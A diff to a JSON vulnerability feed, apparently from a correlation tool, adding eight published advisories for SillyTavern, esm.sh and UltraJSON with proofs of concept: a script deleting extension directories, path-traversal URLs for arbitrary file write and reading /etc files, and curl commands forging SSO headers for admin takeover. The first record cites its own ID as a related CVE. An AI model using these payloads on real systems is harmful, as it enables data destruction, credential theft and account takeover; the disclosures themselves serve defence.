@@ -1,5 +1,234 @@
 {
-  "candidate_count": 0,
-  "candidates": [],
-  "correlated_at": "2026-05-12T22:48:03.783979+00:00"
+  "candidate_count": 8,
+  "candidates": [
+    {
+      "canonical_id": "CVE-2025-59159",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-22"
+      ],
+      "description": "## Summary\n\n`POST /api/extensions/delete` endpoint accepts `extensionName: \".\"` which bypasses \n`sanitize-filename` validation, causing the entire user extensions directory to be \nrecursively deleted. No authentication is required in the default configuration.\n\n## Affected File\n\n`src/endpoints/extensions.js` (last modified: commit `3ad9b05e2`)\n\n## Root Cause\n\nThe validation check occurs **before** sanitization:\n\n```javascript\n// [1] \".\" is truthy \u2014 passes the check\nif (!request.body.extensionName) {\n    return response.status(400).send('Bad Request');\n}\n\n// [2] sanitize(\".\")  \u2192  \"\"\nconst extensionPath = path.join(basePath, sanitize(extensionName));\n// path.join(\"data\\\\default-user\\\\extensions\", \"\")\n// = \"data\\\\default-user\\\\extensions\"  \u2190 basePath itself!\n\n// [3] Deletes the entire extensions directory\nawait fs.promises.rm(extensionPath, { recursive: true });\n```\n\n`sanitize-filename` converts `\".\"` to `\"\"` (documented behavior).  \n`path.join(basePath, \"\")` returns `basePath` itself.  \nResult: the entire `data\\default-user\\extensions\\` directory is deleted.\n\n## Proof of Concept\n\nTested on: Windows 10, SillyTavern v1.17.0, commit `004f1336e`  \nAuthentication: none (basicAuthMode: false, default configuration)\n\nRun in browser console (F12) while SillyTavern is open:\n\n```javascript\nasync function poc() {\n    const { token } = await (await fetch('/csrf-token')).json();\n    const headers = {\n        'Content-Type': 'application/json',\n        'X-CSRF-Token': token,\n    };\n\n    // Before: 1 extension installed\n    const before = await (await fetch('/api/extensions/discover', { headers })).json();\n    console.log('Before:', before.filter(e => e.type === 'local'));\n    // [{ type: 'local', name: 'third-party/Extension-Notebook' }]\n\n    // Attack\n    const res = await fetch('/api/extensions/delete', {\n        method: 'POST',\n        headers,\n        body: JSON.stringify({ extensionName: '.' }),\n    });\n    console.log('Status:', res.status);      // 200\n    console.log('Body:', await res.text());  // \"Extension has been deleted at data\\default-user\\extensions\"\n\n    // After: empty\n    const after = await (await fetch('/api/extensions/discover', { headers })).json();\n    console.log('After:', after.filter(e => e.type === 'local'));\n    // []\n}\npoc();\n```\n\n**Result:**\nBefore: [{ type: 'local', name: 'third-party/Extension-Notebook' }]\nStatus: 200\nBody:   Extension has been deleted at data\\default-user\\extensions\nAfter:  []\n\n## Impact\n\n- **No authentication required** (`basicAuthMode: false` by default).  \n  Any user with network access to the SillyTavern instance can permanently \n  delete the entire extensions directory with a single HTTP request.\n- All installed third-party extensions are unrecoverably lost.\n- With `global: true` and admin privileges, the global extensions directory \n  shared across all users can also be deleted.\n- This vulnerability can be chained with CVE-2025-59159 (DNS rebinding) to \n  enable unauthenticated remote exploitation from a malicious website.\n\n## Same Pattern in Other Endpoints\n\nThe same vulnerability exists in:\n- `POST /api/extensions/update`\n- `POST /api/extensions/version`\n- `POST /api/extensions/branches`\n- `POST /api/extensions/switch`\n\n## Suggested Fix\n\n```javascript\nconst sanitized = sanitize(extensionName);\n\n// Check AFTER sanitizing\nif (!sanitized) {\n    return response.status(400).send('Bad Request: Invalid extension name.');\n}\n\nconst extensionPath = path.join(basePath, sanitized);\n\n// Additional path traversal guard\nconst resolvedPath = path.resolve(extensionPath);\nconst resolvedBase = path.resolve(basePath);\nif (!resolvedPath.startsWith(resolvedBase + path.sep)) {\n    return response.status(400).send('Bad Request: Invalid extension path.');\n}\n```\n\nApply the same fix to `/update`, `/version`, `/branches`, and `/switch` endpoints.\n\n## References\n\n- CWE-22: Improper Limitation of a Pathname to a Restricted Directory\n- CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (9.1 Critical)\n- sanitize-filename npm: https://www.npmjs.com/package/sanitize-filename\n- Related CVE (same project): CVE-2025-59159\n\n\n##REPORTED BY\nJormungandr",
+      "first_seen": "2026-05-12T23:12:29.663883+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-12T23:12:29.663883+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/SillyTavern/SillyTavern/releases/tag/1.18.0",
+        "https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-886q-f44j-h6wh",
+        "https://github.com/advisories/GHSA-886q-f44j-h6wh"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "SillyTavern has a Path Traversal issue"
+    },
+    {
+      "canonical_id": "CVE-2026-44593",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-22"
+      ],
+      "description": "### Impact\n- Arbitrary File Write \u2013 An attacker can cause the server to write data to any file path it has write permission for.\n- Privilege Escalation / RCE \u2013 By overwriting critical binaries or scripts, the attacker can execute arbitrary code with the server\u2019s privileges.\n\n### Exploit\n\nThe legacy router first retrieves a response from `legacyServer`, parses the incoming request path, and ultimately writes the data to storage via `buildStorage.Put`  \n(see <https://github.com/esm-dev/esm.sh/blob/4312ae93e518121e764a18bb521af12e490ef137/server/legacy_router.go#L291>).\n\nFor a URL such as:\n\n```\nhttp://ESM_SH_HOST/v111/react@19.2.0/esnext/..%2f..%2f..%2fgh/<attacker>/exp@1171e85d5d/foo.md%23%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fpwned\n```\n\nthe router concatenates the path components without sanitizing them, producing a storage key like:\n\n```\nlegacy/v111/react@19.2.0/esnext/../../../gh/<attacker>/exp@1171e85d5d/foo.md#/../../../../../../../../../../tmp/pwned\n```\n\nWhen this key is used, the underlying file system resolves the relative segments and writes the file to `/tmp/pwned`. Thus an attacker can craft a request that writes data to arbitrary locations on the server.\n\n\n### Details\n\n1. **URL Construction**  \n   A crafted request is sent to the server:\n   ```\n   http://ESM_SH_HOST/v111/react@19.2.0/esnext/..%2f..%2f..%2fgh/<attacker>/exp@1171e85d5d/foo.md%23%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fpwned\n   ```\n\n2. **Proxy to Legacy Server**  \n   The request is forwarded to:\n   ```\n   http://legacy.esm.sh/v111/react@19.2.0/esnext/../../../gh/<attacker>/exp@1171e85d5d/foo.md#/../../../../../../../tmp/pwned\n   ```\n   which resolves to:\n   ```\n   http://legacy.esm.sh/gh/<attacker>/exp@1171e85d5d/foo.md\n   ```\n\n3. **File Retrieval**  \n   The server fetches `foo.md` from the GitHub repository `https://github.com/<attacker>/exp`.\n\n4. **Path Normalisation & Storage**  \n   The storage path derived from the request is:\n   ```\n   legacy/v111/react@19.2.0/esnext/../../../gh/<attacker>/exp@1171e85d5d/foo.md#/../../../../../../../../../../tmp/pwned\n   ```\n   Normalising this path yields `/tmp/pwned`. The retrieved file content is then written to that location.\n\n5. **Result**  \n   By repeating this pattern, an attacker can overwrite arbitrary binaries or scripts on the server, paving the way for remote code execution.\n\n\n### Credit Discovery To\nsplitline (@\\_splitline\\_) from DEVCORE Research Team",
+      "first_seen": "2026-05-12T23:12:29.664100+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-12T23:12:29.664100+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-3636-h3vx-6465",
+        "https://github.com/esm-dev/esm.sh/releases/tag/v137_3",
+        "https://github.com/esm-dev/esm.sh/security/advisories/GHSA-3636-h3vx-6465"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "esm.sh: Legacy Route Path Traversal Can Lead to RCE"
+    },
+    {
+      "canonical_id": "CVE-2026-44594",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-22"
+      ],
+      "description": "### Summary\n\nA Local File Inclusion (LFI) vulnerability exists in the esbuild plugin's handling of the `browser` field in `package.json`. An attacker can publish an npm package that causes the server to read and return arbitrary files from the host filesystem during the build process.\n\n### Details\n\nThe vulnerable code is in the `OnResolve` callback of the esbuild plugin:\n\nhttps://github.com/esm-dev/esm.sh/blob/main/server/build.go\n\nThe plugin validates that resolved file paths stay within the package working directory. However, after this check, the `browser` field from `package.json` remaps the module path to an attacker-controlled value containing `../` sequences. No validation is performed after the remapping.\n\n```go\n// Sandbox check passes for the original \"./d1.txt\" path\nif !strings.HasPrefix(filename, ctx.wd+string(os.PathSeparator)) {\n    return esbuild.OnResolveResult{}, fmt.Errorf(\"could not resolve module %s\", specifier)\n}\n\n// ... later, browser field remaps to attacker-controlled path:\nif len(pkgJson.Browser) > 0 && ctx.isBrowserTarget() {\n\tif path, ok := pkgJson.Browser[modulePath]; ok {\n\t\tif path == \"\" {\n\t\t\treturn esbuild.OnResolveResult{\n\t\t\t\tPath:      args.Path,\n\t\t\t\tNamespace: \"browser-exclude\",\n\t\t\t}, nil\n\t\t}\n\t\tif !isRelPathSpecifier(path) {\n\t\t\texternalPath, sideEffects, err := ctx.resolveExternalModule(path, args.Kind, withTypeJSON, analyzeMode)\n\t\t\tif err != nil {\n\t\t\t\treturn esbuild.OnResolveResult{}, err\n\t\t\t}\n\t\t\treturn esbuild.OnResolveResult{\n\t\t\t\tPath:        externalPath,\n\t\t\t\tSideEffects: sideEffects,\n\t\t\t\tExternal:    true,\n\t\t\t}, nil\n\t\t}\n\t\tmodulePath = path\n\t}\n}\n\n\n// path.Join collapses \"../\" sequences - escapes the package directory\nfilename = path.Join(ctx.wd, \"node_modules\", ctx.esmPath.PkgName, modulePath)\n// No second sandbox check\n```\n\nFile contents appear in both the bundled JS output and the source map `sourcesContent` array.\n\nReadable files are constrained by esbuild's loader selection based on file extension: `.json` files must be valid JSON, `.txt`/`.html`/`.md` are read as raw text, files without a recognized extension must be syntactically valid JavaScript. The `config.json` of esm.sh is fully readable (valid JSON with `.json` extension).\n\nNon-existent target paths do not cause build errors - the import simply remains unresolved. This allows probing many paths in a single package, acting as a file existence oracle.\n\n### PoC\n\nThe test package is published at https://www.npmjs.com/package/chess-sec-utils1\n\n**package.json:**\n```json\n{\n  \"name\": \"chess-sec-utils1\",\n  \"version\": \"1.0.6\",\n  \"main\": \"index.js\",\n  \"type\": \"module\",\n  \"browser\": {\n    \"./d1.txt\": \"../../../../../../../../etc/hostname\",\n    \"./d2.json\": \"../../../../../../../../etc/os-release\",\n    \"./d3.json\": \"../../../../../../../../etc/environment\"\n  }\n}\n```\n\n**index.js:**\n```js\nimport d1 from \"./d1.txt\"\nimport d2 from \"./d2.json\"\nimport d3 from \"./d3.json\"\nexport default { d1, d2, d3 }\n```\n\n```bash\nnpm publish\ncurl \"https://<esm.sh-instance>/chess-sec-utils1@1.0.6\"\ncurl \"https://<esm.sh-instance>/chess-sec-utils1@1.0.6/es2022/chess-sec-utils1.mjs.map\"\n```\n\nServer file contents in source map response:\n```json\n{\n  \"sourcesContent\": [\n    \"ideapad\\n\",\n    \"PRETTY_NAME=\\\"Ubuntu 22.04.5 LTS\\\"\\nNAME=\\\"Ubuntu\\\"\\nVERSION_ID=\\\"22.04\\\"\\nVERSION=\\\"22.04.5 LTS (Jammy Jellyfish)\\\"\\nVERSION_CODENAME=jammy\\nID=ubuntu\\nID_LIKE=debian\\nHOME_URL=\\\"https://www.ubuntu.com/\\\"\\nSUPPORT_URL=\\\"https://help.ubuntu.com/\\\"\\nBUG_REPORT_URL=\\\"https://bugs.launchpad.net/ubuntu/\\\"\\nPRIVACY_POLICY_URL=\\\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\\\"\\nUBUNTU_CODENAME=jammy\\n\",\n    \"PATH=\\\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\\\"\\n\",\n    \"import d1 from \\\"./d1.txt\\\"...\"\n  ]\n}\n```\n\n<img width=\"1720\" height=\"796\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ee1c9781-2c5c-4718-b436-f6cf453f0952\" />\n\n### Impact\n\nAn attacker can read sensitive files from the server, including the esm.sh `config.json` which may contain npm registry authentication tokens and S3 storage credentials.\n\n### Fix\n\nAdd a path validation check after the `browser` field remapping:\n\n```go\nfilename = path.Join(ctx.wd, \"node_modules\", ctx.esmPath.PkgName, modulePath)\nif !strings.HasPrefix(filename, ctx.wd+string(os.PathSeparator)) {\n    return esbuild.OnResolveResult{}, fmt.Errorf(\"path traversal blocked\")\n}\n```\n\n### Credit\nSvyatoslav Berestovsky of Metascan",
+      "first_seen": "2026-05-12T23:12:29.663988+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-12T23:12:29.663988+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-rg65-45m7-hq57",
+        "https://github.com/esm-dev/esm.sh/releases/tag/v137",
+        "https://github.com/esm-dev/esm.sh/security/advisories/GHSA-rg65-45m7-hq57"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "esm.sh: Path Traversal via package.json browser field allows reading arbitrary server files"
+    },
+    {
+      "canonical_id": "CVE-2026-44648",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-613"
+      ],
+      "description": "### Summary\nChanging a user\u2019s password does not invalidate existing sessions, allowing an attacker with a stolen cookie to retain access even after the victim resets their password.\n\n### Details\nSillyTavern relies on cookie-session for authentication, storing all session data (user handle, permissions) in a signed cookie. The endpoints POST /api/users/change-password and POST /api/users/recover-step2 only update the password hash in the database but do not expire current sessions. Because the session is stateless and stored entirely in the client cookie, there is no server-side mechanism to revoke a token once issued.\n\n### PoC\n1.Log into the same SillyTavern account from two different browsers (e.g., Chrome and Firefox private mode).\n2.In Chrome, change the account password under User Settings \u2192 Change Password.\n3.In Firefox, refresh the page or perform a protected action (e.g., view API keys).\n4.Expected: Firefox session should be invalidated and ask for login.\n5.Actual: Firefox remains fully authenticated, able to perform all actions as the targeted user.\n\n### Impact\nAn attacker who obtains a valid session cookie (via XSS, MITM, physical access, etc.) can continue using it indefinitely, even after the legitimate user changes their password.\nThis nullifies the most common recovery measure against session theft.\nThe default cookie lifespan is 400 days, giving an attacker a very long exploitation window.\n\n### Resolution\nA fix was released in the version 1.18.0, invalidating a session cookie on account password change.",
+      "first_seen": "2026-05-12T23:12:29.663979+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-12T23:12:29.663979+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/SillyTavern/SillyTavern/releases/tag/1.18.0",
+        "https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-wmm3-h9qj-p5v6",
+        "https://github.com/advisories/GHSA-wmm3-h9qj-p5v6"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "SillyTavern: Existing sessions are not invalidated after password change, allowing session reuse and account takeover"
+    },
+    {
+      "canonical_id": "CVE-2026-44649",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-290",
+        "CWE-306",
+        "CWE-346",
+        "CWE-807"
+      ],
+      "description": "## Resolution\n\nSillyTavern 1.18.0 now includes a configuration option to limit which IP addresses can authorize using SSO headers, limiting to just loopback addresses by default. A setting can be customized according to user's needs.\n\nDocumentation: https://docs.sillytavern.app/administration/sso/\n\n## Summary\n\nSillyTavern accepts `Remote-User` (Authelia) and `X-Authentik-Username` (Authentik) HTTP\nheaders to automatically log in users when SSO is configured. There is no validation that\nthese headers originate from a trusted reverse proxy. Any network client that can reach\nthe SillyTavern port directly can inject these headers and authenticate as any user,\nincluding administrators, without a password. This vulnerability is exploitable only when `sso.autheliaAuth: true` or\n`sso.authentikAuth: true` is set in `config.yaml` (both default to `false`).\n\n### Detials\n\nSillyTavern implements header-based SSO for Authelia and Authentik. When enabled, the\n`tryAutoLogin` function (called on every request to `/login`) invokes `headerUserLogin`,\nwhich reads an HTTP header set by the upstream proxy and automatically creates an\nauthenticated session for the matching user:\n\n`src/users.js:779-801`:\n\n```js\nasync function headerUserLogin(request, header = 'Remote-User') {\n    if (!request.session) { return false; }\n\n    const remoteUser = request.get(header);  // reads any header from any client\n    if (!remoteUser) { return false; }\n\n    const userHandles = await getAllUserHandles();\n    for (const userHandle of userHandles) {\n        if (remoteUser.toLowerCase() === userHandle) {\n            const user = await storage.getItem(toKey(userHandle));\n            if (user && user.enabled) {\n                request.session.handle = userHandle; \n                return true;\n            }\n        }\n    }\n    return false;\n}\n```\n\n`request.get(header)` is Express's wrapper for `req.headers[name.toLowerCase()]`.\nExpress does not distinguish between headers set by a trusted upstream proxy and headers\ninjected by the end client. Without an IP allowlist check, any client can set\n`Remote-User: ` and receive an authenticated session cookie.\n\n### User Enumeration Pre-Condition\n\nThe `/api/users/list` endpoint is registered before `requireLoginMiddleware` in\n`src/server-main.js:236`, making it publicly accessible without authentication:\n\n`src/server-main.js:236,239`:\n```js\napp.use('/api/users', usersPublicRouter);  // line 236 (public)\napp.use(requireLoginMiddleware);           // line 239 (auth gate)\n```\n\n`src/endpoints/users-public.js:26-57`:\n```js\nrouter.post('/list', async (_request, response) => {\n    if (DISCREET_LOGIN) { return response.sendStatus(204); }\n    const users = await storage.values(x => x.key.startsWith(KEY_PREFIX));\n    return response.json(viewModels);  // returns handle, name, avatar, admin, password flags\n});\n```\n\nThis allows an attacker to enumerate all user handles (including admin handles) without\nany prior credentials.\n\n## PoC\n\n```bash\nTARGET=\"http://localhost:8000\"\n\n# enumerate users\ncurl -s -X POST \"$TARGET/api/users/list\" -H \"Content-Type: application/json\" -d '{}'\n\n# inject Remote-User header, receive authsession\ncurl -s -L \\\n  -H \"Remote-User: admin-user\" \\\n  -c /tmp/st-session.txt \\\n  \"$TARGET/login\"\n\n\n# obtain CSRF token, call admin API\nTOKEN=$(curl -s -b /tmp/st-session.txt \"$TARGET/csrf-token\" | python3 -c \"import sys,json; print(json.load(sys.stdin)['token'])\")\n\ncurl -s -X POST \"$TARGET/api/users/admin/get\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"X-CSRF-Token: $TOKEN\" \\\n  -b /tmp/st-session.txt \\\n  -d '{}'\n```\n\n---\n\n## Impact\n\nAn account takeover, allowing an attacker to do anything a legitimately authorized user can do.",
+      "first_seen": "2026-05-12T23:12:29.663909+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-12T23:12:29.663909+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/SillyTavern/SillyTavern/releases/tag/1.18.0",
+        "https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-gxx6-h3g6-vwjh",
+        "https://github.com/advisories/GHSA-gxx6-h3g6-vwjh"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "SillyTavern has Authentication Bypass via SSO Header Injection"
+    },
+    {
+      "canonical_id": "CVE-2026-44651",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-79"
+      ],
+      "description": "## Resolution\n\nFixed in SillyTavern 1.18.0: a user-provided URL is no longer reflected in the HTTP response body.\n\n## Overview\n- Vulnerability Type: XSS\n- Affected Location: `src/middleware/corsProxy.js:40`\n- Trigger Scenario: reflected XSS in CORS proxy error response\n\n## Root Cause\nWhen `fetch(url)` throws, the code sends:\n`res.status(500).send('Error occurred while trying to proxy to: ' + url + ' ' + error)`.\nThe `url` value is attacker-controlled (`req.params.url`) and is not HTML-escaped before rendering.\n\n## Source-to-Sink Chain\n1. Source (user-controlled input)\n- Entry point: `GET /proxy/:url(*)`\n\n2. Data flow\n- Code analysis shows concrete propagation into this sink:\n  - vulnerability title: `Reflected XSS in CORS proxy error response`\n  - sink location reached by attacker-controlled input: `src/middleware/corsProxy.js:40`\n- The same sink behavior is confirmed by controlled execution observations.\n\n3. Sink (dangerous operation)\n- Sink location: `src/middleware/corsProxy.js:40`\n- Vulnerable behavior: reflected XSS in CORS proxy error response\n\n## Exploitation Preconditions\n1. The attacker can inject controllable content into a rendered response.\n2. The vulnerable rendering context does not apply strict output encoding/sanitization.\n3. A victim user opens the affected page or response.\n\n## Risk\nThis issue enables script execution in the victim context and can compromise session or data integrity.\n\n## Impact\nAn attacker may run arbitrary JavaScript in the victim context, steal tokens, and manipulate user-visible behavior.\n\n## Remediation\n1. Never concatenate raw user input into HTML error responses.\n2. If URL echo is required, HTML-escape it or force plain-text output.\n3. Re-enable/strengthen CSP to reduce reflected injection impact.",
+      "first_seen": "2026-05-12T23:12:29.663852+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-12T23:12:29.663852+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/SillyTavern/SillyTavern/releases/tag/1.18.0",
+        "https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-xc4x-2452-5gc9",
+        "https://github.com/advisories/GHSA-xc4x-2452-5gc9"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "SillyTavern has a reflected XSS vulnerability in the CORS proxy middleware"
+    },
+    {
+      "canonical_id": "CVE-2026-44652",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-918"
+      ],
+      "description": "## Resolution\n\nSillyTavern 1.18.0 added a generic server-side request filter (Private Request Whitelisting). Since we expect users to use the application in a trusted environment, the filter is disabled by default, however it is strongly advised to be enabled and properly configured when an instance is being hosted over a network, as suggested by a console warning message and an officially published security checklist for administrators.\n\nDocumentation: \n\n- https://docs.sillytavern.app/administration/config-yaml/#private-address-whitelisting\n- https://docs.sillytavern.app/administration/#security-checklist\n\n## Note on future SSRF findings\n\nSince the request filter applies to the entire application, no SSRF vulnerabilities against individual endpoints will be accepted, unless it has been proven that a properly configured and enabled filter can be bypassed in an undocumented way. Only advisories disclosed before the 1.18.0 release will be posted if their concern is SSRF.\n\n## Overview\n- Vulnerability Type: SSRF\n- Affected Location: `src/middleware/corsProxy.js:31`\n- Trigger Scenario: SSRF in optional CORS proxy\n\n## Root Cause\n`corsProxyMiddleware` forwards `req.params.url` directly into `fetch(url, ...)`. It only blocks circular requests to its own host and does not enforce destination allowlist or private/loopback restrictions, enabling SSRF.\n\n## Source-to-Sink Chain\n1. Source (user-controlled input)\n- Entry point: `GET /proxy/:url(*)`\n\n2. Data flow\n- Code analysis shows concrete propagation into this sink:\n  - vulnerability title: `SSRF in optional CORS proxy`\n  - sink location reached by attacker-controlled input: `src/middleware/corsProxy.js:31`\n- The same sink behavior is confirmed by controlled execution observations.\n\n3. Sink (dangerous operation)\n- Sink location: `src/middleware/corsProxy.js:31`\n- Vulnerable behavior: SSRF in optional CORS proxy\n\n## Exploitation Preconditions\n1. The attacker can control or influence a URL/endpoint parameter.\n2. The server can access internal or sensitive network targets.\n3. Outbound request validation or redirect controls are insufficient.\n\n## Risk\nThis issue can be used to pivot network access and reach unintended internal resources.\n\n## Impact\nAn attacker may access internal network services or metadata endpoints and exfiltrate sensitive responses.\n\n## Remediation\n1. Enforce strict destination allowlist for proxy targets.\n2. Block loopback, link-local, RFC1918, and metadata address ranges.\n3. Apply the same destination validation to redirects.",
+      "first_seen": "2026-05-12T23:12:29.663843+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-12T23:12:29.663843+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/SillyTavern/SillyTavern/releases/tag/1.18.0",
+        "https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-ccfq-2454-f5xw",
+        "https://github.com/advisories/GHSA-ccfq-2454-f5xw"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "SillyTavern has a SSRF vulnerability in the CORS proxy middleware"
+    },
+    {
+      "canonical_id": "CVE-2026-44660",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-401"
+      ],
+      "description": "### Summary\n\nWhen `ujson.dump()` writes to a file-like object and the write operation raises an exception, the serialized JSON string object is not decremented, leaking memory. Each failed write operation leaks the full size of the serialized payload.\n\nCode that uses `ujson.dumps()` rather than `ujson.dump()` or only JSON load/decode methods is unaffected.\n\n### Details\n\n**Vulnerability Location:**\n- `src/ujson/python/objToJSON.c:913` - `objToJSONFile()` function start\n- `src/ujson/python/objToJSON.c:931` - Error return on write failure\n- `src/ujson/python/objToJSON.c:942` - Early return without cleanup\n \n**Root Cause:**\n\nThe `objToJSONFile()` function allocates a Python string object via `ujson_dumps_internal()`, calls the file's `write()` method, and returns early if `write()` raises an exception\u2014but never calls `Py_DECREF(string)` on the early exit path.\n\n### PoC\n```python\nimport gc, tracemalloc, ujson\n\nclass BadFile:\n    def write(self, s):\n        raise RuntimeError(\"boom\")\n\nobj = {\"x\": \"A\" * 200000}\n\ndef run():\n    try:\n        ujson.dump(obj, BadFile())\n    except RuntimeError:\n        pass\n\nrun()\ntracemalloc.start()\ngc.collect()\nbase = tracemalloc.get_traced_memory()[0]\n\nfor i in range(5):\n    run()\n    gc.collect()\n    cur = tracemalloc.get_traced_memory()[0]\n    print(i, cur - base)\n```\n\n### Impact\n\nAny application that serializes data through `ujson.dump()` to an attacker-influenced file-like object that can fail can be driven into linear memory growth. An attacker can quickly use up all the memory of say a web server that sends JSON responses using `ujson.dump()` by repeatedly making requests then closing the connection mid response.\n\n### Remediation\n\nThe missing dec-refs were added in 82af1d0ac01d09aa40c887b460d44b9d9f4bccd9. We recommend upgrading to [UltraJSON 5.12.1](https://github.com/ultrajson/ultrajson/releases/tag/5.12.1).\n\n### Workarounds\n\nReplacing `ujson.dump(obj, file)` with `file.write(ujson.dumps(obj))` is equivalent (contrary to popular misconception, there are no streaming benefits to using `ujson.dump()`) and will avoid the memory leak.",
+      "first_seen": "2026-05-12T23:12:29.663807+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-12T23:12:29.663807+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-c38f-wx89-p2xg",
+        "https://github.com/ultrajson/ultrajson/commit/82af1d0ac01d09aa40c887b460d44b9d9f4bccd9",
+        "https://github.com/ultrajson/ultrajson/releases/tag/5.12.1",
+        "https://github.com/ultrajson/ultrajson/security/advisories/GHSA-c38f-wx89-p2xg"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "UltraJSON has a Memory Leak in ujson.dump() on Write Failure"
+    }
+  ],
+  "correlated_at": "2026-05-12T23:12:33.967198+00:00"
 }
